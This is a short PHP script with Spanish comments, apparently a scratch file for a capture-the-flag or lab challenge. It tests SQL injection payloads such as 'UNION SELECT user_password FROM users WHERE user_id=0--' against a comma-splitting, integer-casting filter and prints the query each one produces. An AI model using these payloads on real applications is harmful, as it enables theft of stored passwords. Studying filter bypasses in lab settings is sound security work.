<?php
// Nueva estrategia: usar subconsultas o concatenación sin comas
// O mejor: usar el hecho de que solo los primeros N elementos se procesan

// Si envío: 0,0,PAYLOAD
// El elemento [2] será procesado y convertido a int
// Los elementos [3+] NO serán procesados y quedarán como strings

// Entonces necesito que TODO el SQL esté en un solo "elemento" después del explode
// Eso significa: NO usar comas en mi payload SQL!

$payloads = [
    // Intentar sin comas - usando AS para alias
    "0,0,1)) UNION SELECT user_password AS a FROM users WHERE user_id=0--",
    
    // Concatenar todo en una sola columna
    "0,0,1)) UNION SELECT user_password FROM users WHERE user_id=0--",
    
    // Usar solo una columna y que SQLite maneje el resto
    "0,0,1)) OR 1=1 UNION SELECT user_password FROM users WHERE user_id=0--",
];

foreach ($payloads as $payload) {
    echo "\n" . str_repeat("=", 70) . "\n";
    echo "Payload: $payload\n";
    echo "Length: " . strlen($payload) . " chars\n";
    
    if (strlen($payload) > 70) {
        echo "❌ TOO LONG!\n";
        continue;
    }
    
    $tmp = explode(',', $payload);
    echo "Parts after explode: " . count($tmp) . "\n";
    
    for ($i = 0; $i < count($tmp); $i++) {
        $old_count = count($tmp);
        $tmp[$i] = (int)$tmp[$i];
        if($tmp[$i] < 1) {
            unset($tmp[$i]);
        }
        echo "  i=$i, count: $old_count -> " . count($tmp) . "\n";
    }
    
    echo "Parts after filter: " . count($tmp) . "\n";
    print_r($tmp);
    
    $selector = implode(',', array_unique($tmp));
    echo "Selector: '$selector'\n";
    
    $query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
    echo "Query:\n$query\n";
}
?>
